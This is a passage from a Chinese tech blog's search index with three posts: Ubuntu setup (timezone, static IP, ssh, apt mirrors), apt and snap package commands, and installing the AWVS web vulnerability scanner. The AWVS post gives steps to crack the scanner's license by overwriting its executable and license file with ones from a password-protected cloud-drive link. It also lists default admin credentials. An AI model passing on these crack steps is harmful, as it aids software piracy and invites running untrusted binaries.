list-timezones</span><br></pre></td></tr></table></figure><h3 id="设置时区和时间"><a href="#设置时区和时间" class="headerlink" title="设置时区和时间"></a>设置时区和时间</h3><h3 id="查看当前时区"><a href="#查看当前时区" class="headerlink" title="查看当前时区"></a>查看当前时区</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl</span><br></pre></td></tr></table></figure><h3 id="列出所有可用时区"><a href="#列出所有可用时区" class="headerlink" title="列出所有可用时区"></a>列出所有可用时区</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl list-timezones</span><br></pre></td></tr></table></figure><h3 id="设置上海时区"><a href="#设置上海时区" class="headerlink" title="设置上海时区"></a>设置上海时区</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo timedatectl set-timezone Asia/Shanghai</span><br></pre></td></tr></table></figure><blockquote><p>查看是否修改成功：<code>date</code> Fri Dec 14 10:48:05 CST 2018 如果显示CST则说明时区设置成功</p></blockquote><h3 id="查看时间和修改时间"><a href="#查看时间和修改时间" class="headerlink" title="查看时间和修改时间"></a>查看时间和修改时间</h3><p><strong>显示时间 :</strong>  <code>date</code></p><p><strong>修改时间</strong><code>date -s [time]</code></p><p>如：设置当前时间为：2018年12月10点50分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -s  ‘2018-12-14 10:50:00’</span><br></pre></td></tr></table></figure><p><strong>根据网络同步时间</strong></p><p>使用ntp同步标准时间，ntp：网络时间协议（network time protol）</p><p>安装：<code>yum install ntp</code></p><p>同步：<code>ntpdate pool.ntp.org</code></p><h2 id="Ubuntu初始化"><a href="#Ubuntu初始化" class="headerlink" title="Ubuntu初始化"></a>Ubuntu初始化</h2><h3 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h3><p>临时配置ip，立即生效，但重启后无效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo ifconfig eth0 192.168.11.88 netmask 255.255.255.0 //设置网卡eth0的IP地址和子网掩码</span></span><br><span class="line"><span class="meta">$</span><span class="bash">sudo route add default gw 192.168.1.1 //设置网关</span></span><br></pre></td></tr></table></figure><p>修改配置文件<code>/etc/network/interfaces</code>，重启后生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo vi /etc/network/interfaces</span></span><br><span class="line">添加以下内容：</span><br><span class="line"></span><br><span class="line">auto eth0 #设置自动启动eth0接口</span><br><span class="line">iface eth0 inet static #配置静态IP</span><br><span class="line">address 192.168.11.88  #IP地址 </span><br><span class="line">netmask 255.255.255.0  #子网掩码</span><br><span class="line">gateway 192.168.11.1   #默认网关</span><br></pre></td></tr></table></figure><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo systemctl status ssh</span><br><span class="line">sudo ufw allow ssh</span><br></pre></td></tr></table></figure><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p><a href="https://blog.csdn.net/u012308586/article/details/102953882">https://blog.csdn.net/u012308586/article/details/102953882</a></p><p>查看的Ubuntu版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">Ubuntu 20.04.2 LTS \n \l</span><br></pre></td></tr></table></figure><p>跟换成阿里云的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;\</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security multiverse&quot;&gt;/etc/apt/sources.list</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> Linux </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu-常用操作</title>
      <link href="/2021/07/01/Ubuntu-%E5%8C%85%E7%AE%A1%E7%90%86/"/>
      <url>/2021/07/01/Ubuntu-%E5%8C%85%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h2><h3 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h3><p>更新源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt udpate</span><br></pre></td></tr></table></figure><p>更新已经安装的软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>安装软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install firefox</span><br></pre></td></tr></table></figure><p>移除软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove firefox</span><br><span class="line"># 删除并清除配置文件</span><br><span class="line">sudo apt --purge remove firefox</span><br></pre></td></tr></table></figure><p>清理安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoclean</span><br><span class="line">#清理所有安装包</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure><p>搜索软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search firefox</span><br></pre></td></tr></table></figure><p>列出已安装的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure><p>卸载多余依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><h3 id="snap"><a href="#snap" class="headerlink" title="snap"></a>snap</h3><p>snap安装软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap install firefox</span><br></pre></td></tr></table></figure><p>列出安装的软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap list</span><br></pre></td></tr></table></figure><p>搜索软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap find</span><br></pre></td></tr></table></figure><p>更新软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo snap refresh firefox</span><br><span class="line"># 更新全部</span><br><span class="line">sudo snap refresh all</span><br></pre></td></tr></table></figure><p>卸载软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap remove firefox</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWVS扫描器</title>
      <link href="/2020/07/11/AWVS%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
      <url>/2020/07/11/AWVS%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>有的客户特别中意AWVS的扫描报告，简单记录下使用过程。</p><span id="more"></span><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p><a href="https://www.jianguoyun.com/p/DWAi1gcQl-u_CBjbhLgD">https://www.jianguoyun.com/p/DWAi1gcQl-u_CBjbhLgD</a> (访问密码 : 4k21vo)</p><p>将<code>.zip</code>删除</p><p>下一步下一步安装即可。破解过程：</p><ol><li><code>wvsc.exe</code> 覆盖<code>C:\Program Files (x86)\Acunetix\13.0.200205121</code>目录下同名文件</li><li><code>license_info.json</code> 覆盖<code>C:\ProgramData\Acunetix\shared\license</code>目录下同名文件</li></ol><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><a href="https://hub.docker.com/r/secfa/docker-awvs">https://hub.docker.com/r/secfa/docker-awvs</a></p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#  pull 拉取下载镜像</span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"></span><br><span class="line">#  将容器的3443端口映射到宿主机的 13443端口</span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"></span><br><span class="line"># 开放端口</span><br><span class="line">iptables -A INPUT -p tcp --dport 13443 -j ACCEPT</span><br></pre></td></tr></table></figure><p>链接地址<a href="https://127.0.0.1:13443/">https://127.0.0.1:13443/</a></p><h1 id="用户密码"><a href="#用户密码" class="headerlink" title="用户密码"></a>用户密码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin123@email.com</span><br><span class="line">Admin123</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619578517298-4d1bd4bc-45b2-460c-933a-8649c4ab106a.png" alt="img"></p><h2 id="功能表"><a href="#功能表" class="headerlink" title="功能表"></a>功能表</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1600932667082-59ec876e-84dd-4a88-a688-849ed3ca3396.png" alt="img"></h2><ul><li><p><strong>Dashboard</strong>是仪表盘，你扫描过的网站的一些漏洞信息这里会显示</p></li><li><p><strong>Targets</strong>是目标网站，就是你要扫描的目标网站</p></li><li><p><strong>Vulnerabilities</strong>就是漏洞，网站的漏洞</p></li><li><p><strong>Scans</strong>就是扫描目标站点，从Target里面选择目标站点进行扫描</p></li><li><p><strong>Reports</strong>就是漏洞扫描完之后的报告</p></li></ul><h2 id="建立扫描"><a href="#建立扫描" class="headerlink" title="建立扫描"></a>建立扫描</h2><p>点击Targets–&gt;Add Target</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819201434815.png" alt="image-20210819201434815"></p><p>然后进入了下面这个页面，<strong>Scan Speed</strong>可以选择扫描的速度，速度越慢扫描的也越仔细。如果站点是需要登录的网站，这里就要勾选上<strong>Site Login</strong>，如果站点不需要登录的话，这里就不用勾选。这底下还有一个<strong>AcuSensor</strong>，总的来说就是允许扫描仪从PHP、ASP或JSP应用程序中收集更多信息，从而改进扫描结果并使其可靠性更高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.sqlsec.com/2020/04/awvs.html">https://www.sqlsec.com/2020/04/awvs.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
